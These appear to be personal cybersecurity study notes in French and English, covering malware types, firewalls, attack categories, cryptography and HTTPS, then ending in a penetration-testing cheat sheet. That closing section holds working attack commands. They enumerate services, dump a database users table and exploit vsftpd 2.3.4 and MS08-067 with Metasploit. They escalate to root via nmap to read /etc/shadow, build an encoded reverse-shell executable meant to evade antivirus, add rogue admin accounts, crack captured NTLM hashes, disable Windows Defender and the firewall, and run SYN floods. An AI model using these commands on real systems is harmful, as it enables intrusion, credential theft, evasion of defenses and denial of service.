virus : 
 Un programme qui s’attache à un document ou à un autre programme légitime (.doc illisible ...), nécessite l'action humaine : exécuter.
Vers : 
 Un programme autoreproducteur qui utilise principalement les réseaux pour se propager sans action humaine.
Cheval de troie : 
 Un programme malveillant camouflé dans un programme légitime (l'humain l'installe volontairement, crée un backdoor)
Logiciel espion : 
 Un programme malveillant installé dans un ordinateur, généralement à l’insu de l’utilisateur
Botnet : 
 réseau de dispositif infectés, contrôlés à distance pour faire des DDOS ... 
Rançongiciel : 
 logiciel malveillant qui utilise le chiffrement pour empêcher les victimes d’utiliser leur ordinateurs et demande un payement.
 


a firewall is a security software or hardware that monitors incoming and outgoing network traffic via rules.

event : log of a specific action, user login ...
flow : record of network activity, web request ...

types de firewalls : 

 1 packet filering firewalls : examines each packet and accept or reject it.
 2 stateful inspection firewalls : filter the packet and monitor the state of active connections
 3 proxy firewalls (application-level gateways) : acts intermidiary between users and application, can filter specific content (access to domain ...)
 4 Next generation firewalls NGFW : firewall with functions like IPS/IDS, deep packet inspection  
 5 Unified threat management UTM : Firewall with VPN, antivirus, IPS/IDS, content filtering 
 6 Web application firewalls : protect web applications by monitoring and filtering HTTP/HTTPS traffic against SQL injection, XSS ...
 7 software firewalls : installed on computers with interfaces like ISA server, IP COP ...
 
========================================

Sources d'attaques : 
 -zero days : faille de logiciels, vuln rabilit .
 -unpatched software
 -malware : malicious programs : torjan, virus worms ...
 -social engineering : malicious email ...
 -password issues : weak password, by default, never expire ...
 -Eavesdropping/MitM : intrusion dans le LAN, g n ralement la WIFI.
 -Dataleaks
 -Misconfiguration : use of weak ciphers, guest account, website ...
  Denis of service : use of a botnet to send a lot of requests to victime
 -insider/partner/vendor/consultat/third party
 -user error : store password in plaintext ...
 -physical access
 -privilege escalation




Les types d'attaques : 

-Attaque zero Day : tirent g n ralement parti des failles, faiblesse est d tect e dans un logiciel avant qu'elle devienne connue (solution : installer au plus vite les correctifs et les MAJ)
                    unfixed bugs or vulnerabilities in software
                    Exemple : Wannacry exploitait la faille SMBv1 sur windows.

-attaque backdoor (portes d rob es) : type d'attaque qui b nificie d'un acc s ouvert sur votre syst me, cet acc s a  t   
            via un cheval de troie : un logiciel t l charg  depuis une source inconnue qui ouvre un acc s pour le pirate sans que l'utilisateur fasse attention (installe involontairement le parasite)
            Ing nierie sociale : Un texte convaincant ou une d monstration trompeuse sur un site vous a convaincu d'installer une simple barre d'outils dont vous pensez avoir besoin, ou un mail ayant une pi ce jointe (phishing).
            les programmeurs laissent des backdoors dans leurs logiciels   des fins de diagnostic, les pirates les exploitent pour s'intoduire.     

-phishing attack : type of social engineering attack often used to steal user data, including login credentials and credit card numbers. It occurs when an attacker, masquerading as a trusted entity, dupes a victim into opening an email, instant message, or text message. The recipient is then tricked into clicking a malicious link, which can lead to the installation of malware, the freezing of the system as part of a ransomware attack or the revealing of sensitive information.

-La force brute : tenter un maximum de combinaisons de mots de passe avec un dictionnaire

-l'attaque d nis de service :  Exemples ( Attaque TCP SYN flood : plusieurs demandes de connexion vers la cible, Ping of death des paquets IP dont la taille est sup rieure au maximum de 65 535)

-Buffer overflow : d passement de tampon : un bug par lequel un processus, lors de l' criture dans un tampon,  crit   l'ext rieur de l'espace allou  au tampon,  crasant ainsi des informations n cessaires au processus.

-l homme au milieu : s ins re dans les communications entre un client et un serveur Usurpation d IP ...

-Attaque par Drive by Download : script malveillant dans le code HTTP ou PHP de l une des pages.

-Attaque par injection SQL : Injecter un compl ment de la vrai requ te SQL : 
  SELECT * FROM users WHERE account =    or  1  =  1 ; 
 Puisque  1  =  1  est toujours  valu  comme TRUE, la base de donn es renvoie les donn es de tous les utilisateurs au lieu d un seul.

-Attaque XSS (Cross-site scripting) : l attaquant injecte un JavaScript malveillant dans la base de donn es d un site Web

-Attaque par  coute illicite : Les  coutes clandestines sur le r seau, passif : wireshark, actif : r ception du trafic comme si c'est lui le vrai destinataire.

-Les attaques des anniversaires : v rifient l int grit  d un message, Si un attaquant calcule la m me synth se pour son message que l utilisateur, il peut tout   fait remplacer le message de l utilisateur par le sien et il sera accept  par le destinataire.

-Attaque par malware.

 Malware : logiciel malveillant : est un terme g n rique qui d crit tous les programmes ou codes malveillants qui peuvent  tre nocifs pour les syst mes.

types de malware :

-Trojan (cheval de troie) : un logiciel en apparence l gitime, mais qui contient une fonctionnalit  malveillante (un .pdf qui contient un .exe).
                            -il peut  tre un logiciel sous licence et prot g , modifi  par des hackers pour en faire cadeau   la communaut  num rique.
                            -g n ralement il d pose sur la cible des backdoors, rootkits, ransomware et spyware.
                            -exemple : t l charger un logiciel de gravure tr s connu sur le web, l'executable est modifi  par les hackers, ce dernier installe un programme malveillant.
                            solution : ne jamais t l charger sur des sites non fiables.
            
-Vers : faciles   programmer qu'un virus, utilisent des supports comme les mails, les sites web, les serveurs FTP, mais aussi le protocole Netbios, etc...
        Il a la capacit  de se dupliquer une fois qu'il a  t  ex cut .
        Contrairement au virus, le ver se propage sans avoir besoin de se lier   d'autres programmes ex cutables. 
        objectif : espionner, ouvrir une porte d rob e, d truire les donn es, planter les services, executer une commande
        Dans le cadre de la DDOS, le vers est utilis  (comme script) pour que toutes les machines victimes ayant execut  ce vers lancent un ping de la mort sur le site cible.com
        Solution : ne jamais executer les .exe inconnus sur des mails ...

-Virus : Un virus est un programme qui s'auto-reproduit en infectant d'autres programmes.
         -infecte par exemple tous les fichiers .doc qui deviennent illisibles
         solution : avoir un antivirus avec une bonne base virale.

-Droppers : des fichiers ex cutables qui paraissent anodins, lancer le malware au d marrage de la machine, ou   l'ouverture d'un navigateur Internet.
-Downloaders : petit ex cutable. Une fois ex cut  sur votre machine celui-ci va se connecter sur un site web, FTP, IRC, etc. De ce site, il va t l charger un autre programme, en g n ral beaucoup plus agressif, tel un Ver ou un Rootkit.
-Un Dialer est un programme qui est capable d' tablir,   votre insu, une connexion avec votre modem. Ce type de malware compose donc un num ro de t l phone surtax 
-Spywares : permettent de conna tre votre activit  sur l'ordinateur infect . On y retrouve deux grandes familles : Les Keyloggeurs et les Adwares.
  -Adware : pas tr s agressive, se contente de modifier la page de d marrage de votre navigateur internet, ou d'installer un plug-in de recherche sur Internet. Son but ? Vous faire venir sur un site web, vous montrer de la publicit  (ce qui r mun re l'auteur de l'Adware), et  ventuellement de vous voler des informations concernant votre vie priv e (comme par exemple conna tre les sites que vous visitez le plus souvent ou les mots cl s de recherche que vous utilisez).
  -Keyloggeurs : stockent dans un fichier toutes les touches que vous frappez sur le clavier. Le fichier en question, souvent crypt , est ensuite envoy    ou rapatri  par la personne malveillante qui a install  le dispositif.
-Les Flooders : inonder une cible, d nis de service
-Ransomwares : chevaux de Troie infectent votre ordinateur, et crypte vos fichiers avec un algorithme de cryptage
-Les Rootkits : d tecter des failles d'un syst me non patch , fournit au cybercriminel des droits d'administration sur le syst me infect  et de les exploiter   des fins diverses (prise en main   distance, propagation ...)
-Macros : s'ins rents dans des documents de type "suites bureautiques"
-Malware en fichiers BAT (Windows) ou Shell (Unix/Linux) : programmes en .bat ou .sh


TCP SYN flood : le pirate demande plusieurs connexion, la victime attend les r ponses puis sa file d'attente se remplie


-----La cryptographie : 

Le chiffrement sym trique est un syst me de chiffrement qui utilise la m me cl  secr te pour le chiffrement et le d chiffrement

La cryptographie asym trique consiste   utiliser une paire de cl s priv e/publique

-cryptage sym trique : (ex : AES, DES ) 

ALICE copie sa cl  "publique" et l'envoie   BOB

ALICE et BOB commence    changer les messages avec cette cl 

chiffrer et de d chiffrer des messages   l'aide d'une m me cl  qui est publique

R sultat : Celui qui d couvre la cl  peut d chiffrer !

-cryptage asym trique : ( RSA, ECC )

BOB communique sa cl  publique   ALICE
ALICE communique sa cl  publique   BOB

BOB chiffre avec la cl  priv  BOB puis chiffre cl  publique ALICE

ALICE D chiffre avec la cl  priv e d'ALICE et authentifie avec la cl  publique de BOB

R sultat : m me si le pirate a la cl  publique, il ne peut pas d chiffrer le message.

-L'encodage convertit des donn es d'un format   un autre afin de les rendre compatibles avec un syst me ou un protocole : Base64, UTF-8, ASCII

-Le hachage transforme une donn e en une empreinte num rique ( MD5, SHA-256, SHA-512, Argon2, bcrypt ) -> pour stocker les mdp, v rifier l'int grit  checksums, signatures num riques

C'est quoi un certificat : 

Un certificat associe une cl  publique avec l'identit  r elle d'un individu, d'un serveur ... avec la signature de l'autorit  de certification qui a d livr  le certificat et la p riode de validit .

Une autorit  de certification peut aussi  mettre un certificat   destination d'une autre autorit  de certification, donc le user peut  tre amen    v rifier le certificat de l' metteur pour chaque autorit  de certification parente, jusqu'  ce qu'il en atteigne une en qui il a confiance

--Fonctionnement HTTPS : 

HTTPS utilise un chifrement asymetrique:
-la cl  priv e est pr sente chez l'authorit  de certification
-la cl  publique est install  sur le site HTTPS
-->le visiteur t l charge et utilise cette cl  publique sur internet, confirme sa validit  avec l'authorit  de certification puis navigue en s curit .  

Le serveur envoie au client son certificat : celui-ci contient sa cl  publique, ses informations (nom de la soci t , adresse postale, pays, e-mail de contact...) ainsi qu'une signature num rique.

Le navigateur du client tente de v rifier la signature num rique du certificat du serveur en utilisant les cl s publiques contenues dans les certificats des autorit s de certifications (AC) int gr es par d faut dans le navigateur.

Si l'une d'entre elles fonctionne, le navigateur web en d duit le nom de l'autorit  de certification qui a sign  le certificat envoy  par le serveur. Il v rifie que celui-ci n'est pas expir  puis envoie une demande OCSP   cette autorit  pour v rifier que le certificat du serveur n'a pas  t  r voqu .

Si aucune d'entre elles ne fonctionne, le navigateur web tente de v rifier la signature num rique du certificat du serveur   l'aide de la cl  publique contenue dans celui-ci.

 En cas de r ussite, cela signifie que le serveur web a lui-m me sign  son certificat. Un message d'avertissement s'affiche alors sur le navigateur web, pr venant l'utilisateur que l'identit  du serveur n'a pas  t  v rifi e par une autorit  de certification et qu'il peut donc s'agir potentiellement d'un site frauduleux

 En cas d' chec, le certificat est invalide, la connexion ne peut pas aboutir

===================================

Sur un serveur ayant le le r le CA : 
 -G n rer un certificat SSL (auto-sign ) pour les communications LDAPS via le script : 



 -visualiser le certificat sur  MMC / certificat ( personnel / certificats, chercher celle qui vient d' tre cr e)
 -Exporter le certificat SSL vers un fichier .PFX
 -uploader ce pfx sur le serveur   s curiser 

 Ex : activer LDAPS sur le service LDAP azure ADDS : https://hichamkadiri.wordpress.com/category/microsoft-azure/azure-adds/

========== Security : 

Cryptography : hiding or coding "encrypt" information by a secret key.
Symmetric and asymmetric encryption  : Symmetric encryption is an encryption method that uses a single key to encrypt and decrypt data, asymmetric encryption is to crypt by a public key and decrypt by the private key.
IDS VS IPS : IDS : only Detection, IPS : prevention "do actions like drop packet" 
CIA triad : Confidentialit , Int grit  et Disponibilit  : the heals of security.
How the encryption is different from hashing : le hash produit une empreinte "pour ne pas stocker le mdp en clair, par ex MD5, SHA-256", le cryptage produit un text chiffr  que nous pouvons reconstituer avec la cl  de cryptage ex de cl  : 3DES, AES, RSA 
what is a firewall : a hardware who analyse the flow and permet or reject based on rules.
Vulnerability assessment VA : systematic review of security weaknesses in an information system
Penetration Testing PT : exercice de s curit , un white hacker tente d'exploiter les vuln rabilit s
Three way handshake : SYN, SYN-ACK, ACK : utilis s par le protocole TCP entre A et B avant de commencer une communication full-duplex.
reponse code from a web application : 200 OK, 300 redirection, 400 erreur , 500 erreur serveur :  (par ex 401 : autorisation required, 503 : serveur injoignable) 
traceroute : permet de v rifier les pas lors du transit d'un packet.
HIDS and NIDS : HIDS monitor and protect hosts, NIDS monitor the network 
threats : menace de s curit 
steps de setup a firewall : secure the firewall, zoning, configure ACLs, activate logging, test, update continually.
ssl encryption : secure internet connection by encrypting between the browser and the website.
SSL Handshake : Client Hello, Server Hello, Client authenticates the server certificate, Server uses its private key to decrypt the pre-master secret, Both client and server exchange messages.
  -> client and server should have same SSL/TLS version and cipher settings. (cipher is a disguised way of writing a code)
steps de secure a server : disable unnecessary services, strong passwords, activate firewall, update OS and softwares, data encryption, regular backup, monitor logs.
data leakage : Fuite de donn es, transmission de donn es non autoris es depuis une organisation vers une destination externe.
types de cyberattacks : ransomware, Backdoor avec un cheval de troie, virus exe qui infecte des fichiers utiles, DDOS avec un vers, phishing, Brute force, MITM 
what is brut force, how to prevent from it : tentative du mdp via un dictionnaire, bloquer le compte et des alerte en cas de plusieurs tentatives.
port scanning : v rification des ports ouverts
Layers of OSI model : mod le de r f rence th orique : Application(SMTP,HTTP,) pr sentation(codage/d codage) session(RPC) transport( TCP/UDP segment) r seau(IP paquet) liaison de donn es(trame) physique(Bits)
 TCP/IP est une suite de protocole standaris s pour les connexions r seaux : Application, transport, internet, Acc s r seau.
IPSEC : groupe de protocoles qui chiffrent les paquets IP et authentifie la source de donn es.
        IPSec  tablit une connexion s curis e avec un chiffrement asym trique et passe au chiffrement sym trique pour acc l rer le transfert des donn es.
        etapes IPSEC : 
                  Authentication Header (AH) 
                  Encapsulation de la charge utile (ESP)
                  associations de s curit  (ISAKMP)
                  Compression des packets (IPComp)
        Mode IPsec : Tunnel "" et Transport "" 

VPN : connexion chiffr e sur un r seau publique.
Darknet : une partie cach e d'internet accessible de fa on anonyme et s curis e
how to prevent my identity : MFA
White, black and gray hacker : 
patch management : mettre   jour r guli rement les OS et applications
MITM and how to prevent : Man in the middle 
DDOS and how to prevent : Distributed denial of service
XSS and how to prevent : injecter un code JavaScript maveillant dans le site.
ARP on the LAN : @MAC en @IP
port bloking on LAN : blocage de port sur firewall
botnet : R seau de machines infect es et contr l es par un botmaster.
salted hashes : m thode de hachage suppl mentaire au hash normal.
SSL and TLS : protocoles cryptographiques. 
data protection : 
2FA on websites : 
congnitive cybersecurity :
VPN and VLAN : 
phishing :
SQL injection : 




=====
 
 intodns.com : permet d'avoir des d tails sur mon domaine
 la partie MX permet de voir comment est g r  la messagerie : en local, google, O365 ...

 ssl.org : check the TLS config and ciphers of the website 
 howsmyssl.com : check my TLS version and ciphers 

==============================================================

www.exploit-db.com

Scan -> enumeration -> vulnerability analysis --> System Hacking  --> escalation --> Maintaining access --> Clearing logs

scanner le LAN sur KALI ou Parrot : angry IP scanner

Les systèmes modernes utilisent SMB sur le port 445 directement via TCP. (SMBv2, SMBv3)
Les anciennes configurations utilisent SMB via NetBIOS avec les ports 137, 138 et 139. (SMBv1)
il vaut mieux bloquer le SMB via NetBIOS et garder uniquement le 445 ouvert.

sudo nmap -T4 -n -Pn -p- A.B.C.D  (permet de scanner tous les ports de la cible)

nbtstat -C
nbtscan -r -v A.B.C.D

net view \\A.B.C.D /ALL
snmp-check -w A.B.C.D 
nmap -T4 -n -Pn -p 3306 A.B.C.D
mysql -u root -p -h A.B.C.D
 show databases;
 use dvwa;
 show tables;
 select * from users;

sudo nmap -A -T5 -n -Pn -p 2049 A.B.C.D
find / -name *.nse 2>/dev/null | grep nfs (chercher le script nfs)
sudo nmap --script=nfs-ls.nse A.B.C.D 

nc -nv A.B.C.D 25
EHLO billy
VRFY billy
VRFY root
QUIT
smtp-user-enum -M VRFY -u root -t A.B.C.D

ftp A.B.C.D
get secrets.txt (télécharger le fichier)
exit 
nmap -A -T5 -n -Pn -p 21 A.B.C.D
--> le client a la version : vsftp 2.3.4
searchsploit vsftp 2.3.4
sur msf : search vsftp 2.3.4
          use 0
          options
          set rhosts A.B.C.D
          exploit

          puis faire les cmd : id / hostname ...

CVE : Common Vulnerabilities and Exposures.
CWE : Common Weakness Enumeration : des faiblesses qui peuvent conduire à des vulnérabilités.

Nessus & Greenbone : check vulnerability on the target system.

Liste des executables qui nécessitent sudo: 
find / -perm -u=s -type f 2>/dev/null

nmap --interactive
nmap>!sh
 #id
 --> euid = root 
 #cat /etc/shadow


setxkbmap fr

apt update; apt install metasploit-framework

service postgresql start && service apache2 start 
msfdb init
msfconsole 
 ->exploits : code malicieux qui exploite une vulnérabilité
 ->auxiliaires : outils de scan des systèmes, ports, services
 ->les modules post : recherche de mdp, mail, ressources utiles sur les cibles
 ->payloads : code à injecter dans la cible pour établir la connexion
 ->encoders : permet de dissimuler le payload pour qu'il ne soit pas détecté par la cible.
 ->nops : structure qui fait fcontionner le code malveillant selon les platformes
 ->évasions : les modules récents de msfconsole qui génère des payloads indétectables par les antivirus

search platform: windows

msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.1.1.4 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o /tmp/setup.exe  
Final size of exe file: 73802 bytes
Saved as: /tmp/setup.exe


utiliser shellter pour rendre l'exe indétectable par l'antivirus: 
https://www.linkedin.com/pulse/hacking-windows-10-using-metasploit-framework-sheikh-mohammed-aaftab/ 

msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.1.1.4
set LPORT 4444
exploit

net user USER_NAME PASSWORD /add
net localgroup administrators USER_ACCOUNT /add

========================

HKEY_LOCAL_MACHINE / SAM 
C:\Windows\System32\config\SAM
windows authenticate local users with SAM file and AD users with NTLM or kerberos.

-Récupérer le HASH NTLM et le convertir en mdp clair : 
responder -I eth0 -v (copier le hash)
echo Administrator::EXAMPLE:azertyuiopqsdfghjkl >admin.hash
john -w=/usr/share/wordlists/fasttrack.txt admin.hash  -> permet de le convertir en mdp clair.

=======================================

buffer over flows : (saturer la RAM pour pouvoir écraserl'ancien contenu par un payload executable pour prendre le contrôle)

python3 /home/buffalo.py   (dans ce fichier il y a l'ip destination windows , le port dest, mon ip KALI, mon port KALI et des instructions de saturation du buffer)
python3 /home/buffy.py

nc -nvlp 8.8.8.8 (j'écoute sur mon port pour avoir la main cmd)

========================================

netstat -abno

-Turn off Windows defender (malware protection) : 

Set-MpPreference -DisableRealtimeMonitoring $true

or : 
sc stop WinDefend
sc config WinDefend start= disabled

-Turn off Windows firewall (Access rules) : 
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

===========
========================================================
For linux : 
 use exploit/multi/handler
 set payload linux/x64/shell/reverse_tcp
 set LHOST 10.1.1.1
 SET LPORT 4444
 run


========
DOS attack : 
sudo hping3 -S --flood -V -p 80 TARGET_IP
SYN flood attack against a domain : 
sudo hping3 DOMAIN_NAME -q -n -d 120 -S -p 80 --flood --rand-source

========
known vulnerability (ms08_067_netapi) in Windows exploite le RPC : 

  use exploit/windows/smb/ms08_067_netapi
             set RHOSTS 192.168.1.101
             set PAYLOAD windows/meterpreter/reverse_tcp
             set LHOST 192.168.1.102
             exploit
==================================

